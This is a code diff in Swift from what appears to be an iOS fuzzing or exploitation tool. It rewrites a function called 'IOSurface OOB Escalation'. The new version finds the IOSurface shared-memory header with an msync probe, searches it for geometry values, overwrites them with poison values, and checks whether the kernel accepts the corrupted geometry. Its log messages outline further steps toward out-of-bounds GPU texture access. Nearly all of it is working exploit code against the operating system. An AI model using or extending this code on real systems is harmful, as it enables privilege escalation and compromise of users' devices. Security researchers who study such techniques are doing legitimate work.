@@ -2439,30 +2439,27 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
-// ── IOSurface OOB Escalation ──────────────────────────────────────────────────
-// Metal heaps and IOSurface backing live in DIFFERENT VA allocators (GPU aperture
-// vs process VM) — they will never be adjacent by heap spray alone. Instead we:
-//   1. Create the IOSurface and read its backing base address.
-//   2. Use mmap(MAP_FIXED) to place an attacker-controlled page IMMEDIATELY BEFORE
-//      the IOSurface backing in process VA, giving guaranteed adjacency.
-//   3. Create Metal buffer views of both regions via makeBuffer(bytesNoCopy:).
-//   4. Write OOB from the mmap page into the IOSurface pixel buffer.
-//   5. Dump and search the pixel-buffer header for geometry fields; corrupt them.
-//   6. Call IOSurfaceLock — triggers kernel re-read of geometry from shared memory.
-//   7. Compare pre/post geometry via API to detect whether kernel trusts shared mem.
+// ── IOSurface Shared-Memory Escalation ───────────────────────────────────────
+// IOSurfaceGetBaseAddress() returns the PIXEL BUFFER start. The IOSurface shared
+// memory region also contains a header (with geometry fields) at NEGATIVE offsets
+// from that pointer — same mapping, no mmap needed.
+// Strategy:
+//   1. Create IOSurface with magic geometry to make fields searchable.
+//   2. Lock → get pixel-buf VA → find true mapping start via msync boundary scan.
+//   3. Scan the entire shared region (header + pixel buf) for magic values.
+//   4. Write poison values directly via the userspace pointer.
+//   5. IOSurfaceLock → check if kernel picked up corrupted values.
 func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
 
-        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
-        step("── IOSurface OOB Escalation (mmap adjacency) ──")
+        step("── IOSurface Shared-Mem Escalation ──")
 
-        // Magic geometry values — chosen to be unique so we can spot them in the dump
         let SURF_W:   Int    = 0x1337
         let SURF_H:   Int    = 0x0042
-        let SURF_BPR: Int    = SURF_W * 4        // BGRA8 → 4 bytes/pixel
-        let SURF_FMT: UInt32 = 0x42475241         // 'BGRA' little-endian
+        let SURF_BPR: Int    = SURF_W * 4
+        let SURF_FMT: UInt32 = 0x42475241   // 'BGRA' LE
 
         let props: [IOSurfacePropertyKey: Any] = [
             .width:           SURF_W,
@@ -2475,11 +2472,10 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
             step("✗ IOSurface create failed"); completion(); return
         }
 
-        // Lock to stabilise the backing address
         var seed: UInt32 = 0
         IOSurfaceLock(surf, .readOnly, &seed)
-        let surfBaseRaw = IOSurfaceGetBaseAddress(surf)   // non-optional on iOS
-        let allocSz = IOSurfaceGetAllocSize(surf)
+        let surfBaseRaw = IOSurfaceGetBaseAddress(surf)
+        let allocSz     = IOSurfaceGetAllocSize(surf)
         IOSurfaceUnlock(surf, .readOnly, &seed)
         guard UInt(bitPattern: surfBaseRaw) != 0 else {
             step("✗ IOSurfaceGetBaseAddress returned NULL"); completion(); return
@@ -2487,121 +2483,98 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
 
         let surfVA  = UInt(bitPattern: surfBaseRaw)
         let PAGE_SZ = 4096
+        step("pixelBuf VA=0x\(String(surfVA,radix:16)) allocSz=\(allocSz)")
 
-        step("IOSurface base=0x\(String(surfVA,radix:16)) allocSize=\(allocSz)")
-
-        // ── Step 2: mmap one page immediately before the IOSurface backing ──────
-        // surfVA must be page-aligned (IOSurface always allocates page-aligned).
-        // We target surfVA - PAGE_SZ. Use MAP_FIXED: if anything is already mapped
-        // there, the call fails (returned == MAP_FAILED), we log and bail out.
-        let targetVA = surfVA - UInt(PAGE_SZ)
-        let mmapResult = mmap(
-            UnsafeMutableRawPointer(bitPattern: targetVA),
-            PAGE_SZ,
-            PROT_READ | PROT_WRITE,
-            MAP_ANON | MAP_SHARED | MAP_FIXED,
-            -1, 0
-        )
-        let mmapVA = UInt(bitPattern: mmapResult)
-        guard mmapResult != MAP_FAILED, mmapVA == targetVA else {
-            step("✗ mmap MAP_FIXED failed at 0x\(String(targetVA,radix:16)) — VA already mapped")
-            step("  → IOSurface backing VA range not reachable this way; pivoting to ICB path")
-            completion(); return
+        // ── Find true mapping start via msync boundary scan ──────────────────────
+        // msync() returns -1/ENOMEM for unmapped pages — use it to probe backwards.
+        var headerStart = surfVA
+        let MAX_SCAN_BACK = 256 * 1024
+        for back in stride(from: PAGE_SZ, through: MAX_SCAN_BACK, by: PAGE_SZ) {
+            let testVA = surfVA &- UInt(back)
+            let r = msync(UnsafeMutableRawPointer(bitPattern: testVA), PAGE_SZ, MS_ASYNC)
+            if r == -1 { break }
+            headerStart = testVA
         }
-        step("✓ mmap page at 0x\(String(mmapVA,radix:16)) — immediately before IOSurface")
+        let headerOff  = Int(surfVA - headerStart)
+        let totalLen   = headerOff + allocSz
+        step("shared mapping: 0x\(String(headerStart,radix:16))..+0x\(String(totalLen,radix:16))")
+        step("  header before pixel buf: \(headerOff) bytes")
 
-        // Verify adjacency: mmapVA + PAGE_SZ must equal surfVA
-        guard mmapVA + UInt(PAGE_SZ) == surfVA else {
-            step("✗ adjacency check failed (0x\(String(mmapVA+UInt(PAGE_SZ),radix:16)) != 0x\(String(surfVA,radix:16)))")
-            munmap(UnsafeMutableRawPointer(bitPattern: mmapVA), PAGE_SZ); completion(); return
-        }
-        step("✓ adjacency confirmed: mmap end = IOSurface base")
+        let basePtr = UnsafeMutableRawPointer(bitPattern: headerStart)!
+                          .assumingMemoryBound(to: UInt8.self)
 
-        // ── Step 3: Metal buffer views of both regions ───────────────────────────
-        // b0 = attacker-controlled page (OOB source)
-        // b1 = IOSurface backing (OOB target — kernel-read on lock/unlock)
-        let mmapPtr = UnsafeMutableRawPointer(bitPattern: mmapVA)!   // safe: guard above confirmed mmapVA == targetVA != 0
-        guard let b0 = device.makeBuffer(bytesNoCopy: mmapPtr,
-                                          length: PAGE_SZ,
-                                          options: .storageModeShared,
-                                          deallocator: nil) else {
-            step("✗ b0 makeBuffer(bytesNoCopy) failed"); munmap(mmapPtr, PAGE_SZ); completion(); return
-        }
-        guard let b1 = device.makeBuffer(bytesNoCopy: surfBaseRaw,
-                                          length: allocSz,
-                                          options: .storageModeShared,
-                                          deallocator: nil) else {
-            step("✗ b1 makeBuffer(bytesNoCopy) failed"); munmap(mmapPtr, PAGE_SZ); completion(); return
-        }
-        step("b0 Metal buf=0x\(String(UInt(bitPattern:b0.contents()),radix:16)) length=\(PAGE_SZ)")
-        step("b1 Metal buf=0x\(String(UInt(bitPattern:b1.contents()),radix:16)) length=\(allocSz)")
-
-        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
-
-        // Sentinel verify: write 0xAA at b0[PAGE_SZ] and read IOSurface[0]
-        p0[PAGE_SZ] = 0xAA
-        let surfPtr = surfBaseRaw.assumingMemoryBound(to: UInt8.self)
-        guard surfPtr[0] == 0xAA else {
-            step("✗ sentinel miss — OOB write did not land in IOSurface backing")
-            munmap(mmapPtr, PAGE_SZ); completion(); return
-        }
-        p0[PAGE_SZ] = 0x00   // restore
-        step("✓ sentinel confirmed — OOB write reaches IOSurface pixel buffer")
-
-        // ── Step 4: Dump 512 bytes of IOSurface shared memory ───────────────────
-        step("── IOSurface pixel-buffer header (pre-corruption, first 512 B) ──")
-        let dumpLen = min(512, allocSz)
-        var hexLine = ""
-        for i in 0..<dumpLen {
-            if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
-            hexLine += String(format: "%02x ", surfPtr[i])
-        }
-        if !hexLine.isEmpty { step("  \(hexLine)") }
-
-        // ── Step 5: Search for geometry fields by magic values ───────────────────
-        step("── Geometry field search in shared mapping ──")
+        // ── Search entire shared region for magic geometry values ────────────────
         func findU32LE(_ v: UInt32, _ buf: UnsafePointer<UInt8>, _ len: Int) -> Int? {
-            let b: [UInt8] = [UInt8(v & 0xFF), UInt8((v>>8)&0xFF), UInt8((v>>16)&0xFF), UInt8((v>>24)&0xFF)]
-            for i in 0...(len - 4) {
-                if buf[i]==b[0] && buf[i+1]==b[1] && buf[i+2]==b[2] && buf[i+3]==b[3] { return i }
+            guard len >= 4 else { return nil }
+            let b0 = UInt8(v&0xFF), b1 = UInt8((v>>8)&0xFF), b2 = UInt8((v>>16)&0xFF), b3 = UInt8((v>>24)&0xFF)
+            for i in 0...(len-4) {
+                if buf[i]==b0 && buf[i+1]==b1 && buf[i+2]==b2 && buf[i+3]==b3 { return i }
             }
             return nil
         }
-        var widthFieldOff:  Int? = findU32LE(UInt32(SURF_W),    surfPtr, dumpLen)
-        var heightFieldOff: Int? = findU32LE(UInt32(SURF_H),    surfPtr, dumpLen)
-        var bprFieldOff:    Int? = findU32LE(UInt32(SURF_BPR),  surfPtr, dumpLen)
-        var fmtFieldOff:    Int? = findU32LE(SURF_FMT,          surfPtr, dumpLen)
-        step("  width  (0x\(String(SURF_W,  radix:16))): \(widthFieldOff  .map{"@ +0x"+String($0,radix:16)} ?? "NOT FOUND")")
-        step("  height (0x\(String(SURF_H,  radix:16))): \(heightFieldOff .map{"@ +0x"+String($0,radix:16)} ?? "NOT FOUND")")
-        step("  BPR    (0x\(String(SURF_BPR,radix:16))): \(bprFieldOff    .map{"@ +0x"+String($0,radix:16)} ?? "NOT FOUND")")
-        step("  fmt    (0x\(String(SURF_FMT,radix:16))): \(fmtFieldOff    .map{"@ +0x"+String($0,radix:16)} ?? "NOT FOUND")")
 
-        // ── Step 6: OOB write — corrupt geometry if fields found in shared mem ───
+        let widthOff  = findU32LE(UInt32(SURF_W),   basePtr, totalLen)
+        let heightOff = findU32LE(UInt32(SURF_H),   basePtr, totalLen)
+        let bprOff    = findU32LE(UInt32(SURF_BPR), basePtr, totalLen)
+        let fmtOff    = findU32LE(SURF_FMT,          basePtr, totalLen)
+
+        step("── Geometry scan ──")
+        step("  width  (0x\(String(SURF_W,  radix:16))): \(widthOff .map{"@ hdr+0x"+String($0,radix:16)} ?? "NOT FOUND")")
+        step("  height (0x\(String(SURF_H,  radix:16))): \(heightOff.map{"@ hdr+0x"+String($0,radix:16)} ?? "NOT FOUND")")
+        step("  BPR    (0x\(String(SURF_BPR,radix:16))): \(bprOff   .map{"@ hdr+0x"+String($0,radix:16)} ?? "NOT FOUND")")
+        step("  fmt    (0x\(String(SURF_FMT,radix:16))): \(fmtOff   .map{"@ hdr+0x"+String($0,radix:16)} ?? "NOT FOUND")")
+
+        // Dump first 256B of header (pre-pixel region)
+        if headerOff > 0 {
+            step("── shared header dump (pre-pixelbuf, up to 256B) ──")
+            let dumpLen = min(headerOff, 256)
+            var hexLine = ""
+            for i in 0..<dumpLen {
+                if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
+                hexLine += String(format: "%02x ", basePtr[i])
+            }
+            if !hexLine.isEmpty { step("  \(hexLine)") }
+        } else {
+            step("  header region = 0 bytes — geometry likely lives in pixel buffer")
+            step("── pixel buf dump (first 256B) ──")
+            let dumpLen = min(256, allocSz)
+            var hexLine = ""
+            let surfPtr = surfBaseRaw.assumingMemoryBound(to: UInt8.self)
+            for i in 0..<dumpLen {
+                if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
+                hexLine += String(format: "%02x ", surfPtr[i])
+            }
+            if !hexLine.isEmpty { step("  \(hexLine)") }
+        }
+
+        // ── Poison write directly into shared memory ─────────────────────────────
         let POISON_BPR: UInt32 = 0x7FFFFFFF
         let POISON_DIM: UInt32 = 0x00007FFF
-        if let bOff = bprFieldOff {
-            step("── Corrupting BPR field at IOSurface[+0x\(String(bOff,radix:16))] via OOB ──")
-            // OOB offset into p0: PAGE_SZ (end of b0) + bOff (offset into IOSurface)
-            for b in 0..<4 { p0[PAGE_SZ + bOff + b] = UInt8((POISON_BPR >> (b*8)) & 0xFF) }
-            step("  BPR poisoned → 0x\(String(POISON_BPR,radix:16))")
+        var corrupted = false
+
+        if let off = bprOff {
+            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_BPR
+            step("  poison BPR=0x\(String(POISON_BPR,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            corrupted = true
         }
-        if let wOff = widthFieldOff {
-            for b in 0..<4 { p0[PAGE_SZ + wOff + b] = UInt8((POISON_DIM >> (b*8)) & 0xFF) }
-            step("  width poisoned → 0x\(String(POISON_DIM,radix:16))")
+        if let off = widthOff {
+            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_DIM
+            step("  poison W=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            corrupted = true
         }
-        if let hOff = heightFieldOff {
-            for b in 0..<4 { p0[PAGE_SZ + hOff + b] = UInt8((POISON_DIM >> (b*8)) & 0xFF) }
-            step("  height poisoned → 0x\(String(POISON_DIM,radix:16))")
+        if let off = heightOff {
+            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_DIM
+            step("  poison H=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            corrupted = true
         }
-        if bprFieldOff == nil && widthFieldOff == nil {
-            step("  no geometry fields in shared mem — writing blind poison at [0..11]")
-            for b in 0..<4 { p0[PAGE_SZ + 0 + b] = UInt8((POISON_BPR >> (b*8)) & 0xFF) }
-            for b in 0..<4 { p0[PAGE_SZ + 4 + b] = UInt8((POISON_DIM >> (b*8)) & 0xFF) }
-            for b in 0..<4 { p0[PAGE_SZ + 8 + b] = UInt8((POISON_DIM >> (b*8)) & 0xFF) }
+        if !corrupted {
+            step("  no fields found — blind poison at hdr+0x0..+0xb")
+            let p32 = basePtr.assumingMemoryBound(to: UInt32.self)
+            p32[0] = POISON_BPR; p32[1] = POISON_DIM; p32[2] = POISON_DIM
         }
 
-        // ── Step 7: IOSurfaceLock — triggers kernel geometry re-read path ─────────
-        step("── IOSurfaceLock (kernel geometry read path) ──")
+        // ── IOSurfaceLock — triggers kernel geometry re-read ─────────────────────
+        step("── IOSurfaceLock post-corruption ──")
         var seed2: UInt32 = 0
         let lockKR = IOSurfaceLock(surf, [], &seed2)
         step("  lock kr=\(lockKR) seed=\(seed2)")
@@ -2609,24 +2582,21 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
             let w2   = IOSurfaceGetWidth(surf)
             let h2   = IOSurfaceGetHeight(surf)
             let bpr2 = IOSurfaceGetBytesPerRow(surf)
-            let al2  = IOSurfaceGetAllocSize(surf)
-            step("  post-lock: width=\(w2) height=\(h2) BPR=\(bpr2) allocSize=\(al2)")
+            step("  post-lock: width=\(w2) height=\(h2) BPR=\(bpr2)")
             if w2 != SURF_W || h2 != SURF_H || bpr2 != SURF_BPR {
-                step("  *** GEOMETRY CHANGED — kernel reads from attacker-controlled shared memory ***")
+                step("  *** GEOMETRY CHANGED — kernel trusts attacker-controlled shared memory ***")
                 step("  *** width \(SURF_W)→\(w2)  height \(SURF_H)→\(h2)  BPR \(SURF_BPR)→\(bpr2) ***")
-                step("  *** NEXT STEP: make a texture from this surface → OOB GPU texture map ***")
+                step("  *** NEXT STEP: make texture from surface → OOB GPU texture map ***")
             } else {
-                step("  geometry stable — kernel maintains its own validated copy (hardened)")
-                step("  → shared-memory geometry is read-only to the kernel on this iOS version")
-                step("  → PIVOT: use ICB/indirect-dispatch path for GPU command corruption")
+                step("  geometry stable — kernel has its own hardened copy (shared mem ignored)")
+                step("  → PIVOT: ICB/indirect-dispatch corruption path")
             }
             IOSurfaceUnlock(surf, [], &seed2)
         } else {
-            step("  lock failed kr=\(lockKR) — sandbox or lock contention")
+            step("  lock failed kr=\(lockKR)")
         }
 
-        munmap(mmapPtr, PAGE_SZ)
-        step("── IOSurface OOB Escalation complete ──────────")
+        step("── IOSurface Escalation complete ──────────")
         completion()
     }
 }
